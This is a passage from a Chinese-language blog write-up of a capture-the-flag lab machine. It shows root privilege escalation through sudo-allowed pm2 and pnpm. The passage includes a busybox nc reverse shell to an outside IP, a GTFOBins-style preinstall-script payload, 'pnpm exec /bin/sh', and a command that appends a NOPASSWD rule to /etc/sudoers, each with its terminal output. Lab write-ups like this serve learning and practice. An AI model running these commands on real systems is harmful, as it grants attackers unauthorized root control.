<span class="pl-s">&gt; <span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/read_root.sh
lingdong:/tmp$ chmod +x /tmp/read_root.sh
lingdong:/tmp$ ls
read_root.sh
lingdong:/tmp$ sudo /root/.local/share/pnpm/global-bin/pm2 start /tmp/read_root.sh --interpreter=/bin/sh -f
[PM2] Starting /tmp/read_root.sh <span class="pl-k">in</span> fork_mode (1 instance)
[PM2] Done.
┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   │
├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
│ 1  │ read_root          │ fork     │ 0    │ stopped   │ 0%       │ 0b       │
│ 0  │ <span class="pl-c1">test</span>               │ fork     │ 15   │ errored   │ 0%       │ 0b       │
└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘
lingdong:/tmp$ cat /tmp/root_content
flag{root-b89ed76b27e91ad5d773ddadae256072}
lingdong:/tmp$</pre></div>
<p>能读文件,试试反弹<code class="notranslate">shell</code>，注意，靶机只有<code class="notranslate">sh</code>且软连接到<code class="notranslate">busybox</code></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ ls -l /bin/sh
lrwxrwxrwx    1 root     root            12 Jun  3 08:13 /bin/sh -<span class="pl-k">&gt;</span> /bin/busybox
lingdong:/tmp$ cat read_root.sh
<span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
busybox nc 192.168.31.126 1234 -e /bin/sh
lingdong:/tmp$ sudo /root/.local/share/pnpm/global-bin/pm2 start /tmp/read_root.sh --interpreter=/bin/sh -f
[PM2] Applying action restartProcessId on app [read_root](ids: [ 0 ])
[PM2] [read_root](0) ✓
[PM2] Process successfully started
┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   │
├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
│ 0  │ read_root          │ fork     │ 15   │ online    │ 0%       │ 892.0kb  │
└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘
lingdong:/tmp$
kali# nc -lvp 1234
listening on [any] 1234 ...
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
<span class="pl-c1">cd</span>
cat ro<span class="pl-k">*</span>
flag{root-b89ed76b27e91ad5d773ddadae256072}</pre></div>
<p>找到 <code class="notranslate">root.txt</code> 为<code class="notranslate"> flag{root-b89ed76b27e91ad5d773ddadae256072}</code></p>
<h5>方法2：<code class="notranslate">pnpm</code>提权</h5>
<p>查阅[<a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a>](<a href="https://gtfobins.github.io/)%E5%8F%82%E7%85%A7%60npm%60%E7%8E%B0%E6%88%90%E6%96%B9%E6%A1%88" rel="nofollow">https://gtfobins.github.io/)参照`npm`现成方案</a></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">TF=<span class="pl-s"><span class="pl-pds">$(</span>mktemp -d<span class="pl-pds">)</span></span>
<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>{"scripts": {"preinstall": "/bin/sh"}}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-smi">$TF</span>/package.json
sudo npm -C <span class="pl-smi">$TF</span> --unsafe-perm i
<span class="pl-c"><span class="pl-c">#</span>创建临时目录 TF=$(mktemp -d)</span>
<span class="pl-c"><span class="pl-c">#</span>植入恶意脚本echo '{"scripts": {"preinstall": "/bin/sh"}}' &gt; $TF/package.json</span>
payload 结构：
{
  <span class="pl-s"><span class="pl-pds">"</span>scripts<span class="pl-pds">"</span></span>: {
    <span class="pl-s"><span class="pl-pds">"</span>preinstall<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>  // 关键提权点
  }
}
攻击原理：
npm 在安装包时自动执行 preinstall 生命周期脚本。
此处将 /bin/sh 定义为预安装脚本，触发时直接启动交互式 shell。
<span class="pl-c"><span class="pl-c">#</span>触发特权执行sudo npm -C $TF --unsafe-perm i</span>
-C <span class="pl-smi">$TF</span>,指定工作目录为临时目录,强制加载恶意 package.json
--unsafe-perm,强制保留root权限执行脚本，使/bin/sh获得root shell
i,触发安装命令,执行preinstall脚本</pre></div>
<p>成功提权</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ TF=<span class="pl-s"><span class="pl-pds">$(</span>mktemp -d<span class="pl-pds">)</span></span>
lingdong:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>{"scripts": {"preinstall": "/bin/sh"}}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-smi">$TF</span>/package.json
lingdong:/tmp$  sudo /usr/bin/pnpm -C <span class="pl-smi">$TF</span> --unsafe-perm i
Already up to date

<span class="pl-k">&gt;</span> @ preinstall /tmp/tmp.GemLlH
<span class="pl-k">&gt;</span> /bin/sh

/tmp/tmp.GemLlH <span class="pl-c"><span class="pl-c">#</span> id</span>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
<h5>方法3：<code class="notranslate">pnpm</code>优雅提权</h5>
<p>查阅[<a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a>](<a href="https://gtfobins.github.io/)%E5%8F%82%E7%85%A7%60npm%60%E7%8E%B0%E6%88%90%E6%96%B9%E6%A1%88%EF%BC%88%60pnpm%60%E5%B0%B1%E6%98%AF%E6%9B%B4%E7%89%9B%E9%80%BC%E7%9A%84%60npm%60%EF%BC%8C%E7%94%A8%60tldr%60%E7%9C%8B%E7%94%A8%E6%B3%95%E9%83%BD%E4%B8%80%E6%A0%B7%EF%BC%89%EF%BC%8C%E8%BF%90%E8%A1%8C%60sudo" rel="nofollow">https://gtfobins.github.io/)参照`npm`现成方案（`pnpm`就是更牛逼的`npm`，用`tldr`看用法都一样），运行`sudo</a> pnpm exec /bin/sh`直接提权</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ sudo pnpm <span class="pl-c1">exec</span> /bin/sh
 ERR_PNPM_RECURSIVE_EXEC_NO_PACKAGE  No package found <span class="pl-k">in</span> this workspace
lingdong:/tmp$ find -name package.json <span class="pl-k">2&gt;</span>/dev/null
./tmp.GemLlH/package.json
lingdong:/tmp$ <span class="pl-c1">cd</span> ./tmp.GemLlH/
lingdong:/tmp/tmp.GemLlH$ ll
total 8
-rw-r--r--    1 welcome  welcome         39 Jun  7 11:17 package.json
drwxrwxrwt    6 root     root           280 Jun  7 11:17 ..
-rw-r--r--    1 root     root           114 Jun  7 11:17 pnpm-lock.yaml
drwxr-xr-x    2 root     root            60 Jun  7 11:21 node_modules
drwx------    3 welcome  welcome        100 Jun  7 11:21 <span class="pl-c1">.</span>
lingdong:/tmp/tmp.GemLlH$ sudo pnpm <span class="pl-c1">exec</span> /bin/sh
/tmp/tmp.GemLlH <span class="pl-c"><span class="pl-c">#</span> id</span>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
<p>直接执行报错，原因是<code class="notranslate">pnpm exec</code> 命令需要在包含 <code class="notranslate">package.json</code> 的<code class="notranslate">Node.js</code>项目根目录中执行，可以切换到有<code class="notranslate">package.json</code>的目录就可以成功提权了</p>
<p>也可以执行命令<code class="notranslate">sudo /usr/bin/pnpm init</code>初始化当前目录，使用默认值创建一个 <code class="notranslate">package.json </code>文件</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ sudo /usr/bin/pnpm init
Wrote to /tmp/package.json

{
  <span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>tmp<span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>version<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>1.0.0<span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>description<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>main<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>index.js<span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>scripts<span class="pl-pds">"</span></span>: {
    <span class="pl-s"><span class="pl-pds">"</span>test<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>echo <span class="pl-cce">\"</span>Error: no test specified<span class="pl-cce">\"</span> &amp;&amp; exit 1<span class="pl-pds">"</span></span>
  },
  <span class="pl-s"><span class="pl-pds">"</span>keywords<span class="pl-pds">"</span></span>: [],
  <span class="pl-s"><span class="pl-pds">"</span>author<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>license<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>ISC<span class="pl-pds">"</span></span>,
  <span class="pl-s"><span class="pl-pds">"</span>packageManager<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>pnpm@10.11.1<span class="pl-pds">"</span></span>
}
lingdong:/tmp$ sudo pnpm <span class="pl-c1">exec</span> /bin/sh
/tmp <span class="pl-c"><span class="pl-c">#</span> id</span>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
<h5>拿到<code class="notranslate">root.txt</code></h5>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> id</span>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cd</span>
<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
flag{root-b89ed76b27e91ad5d773ddadae256072}</pre></div>
<p><strong>群友解法分享</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>直接修改sudoers文件</span>
sudo /usr/bin/pnpm <span class="pl-c1">exec</span> -- /bin/sh -c <span class="pl-s"><span class="pl-pds">'</span>echo "welcome ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers<span class="pl-pds">'</span></span>
</pre></div></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Pingsag3 Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","pingsag3/pingsag3.github.io");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>


</html>
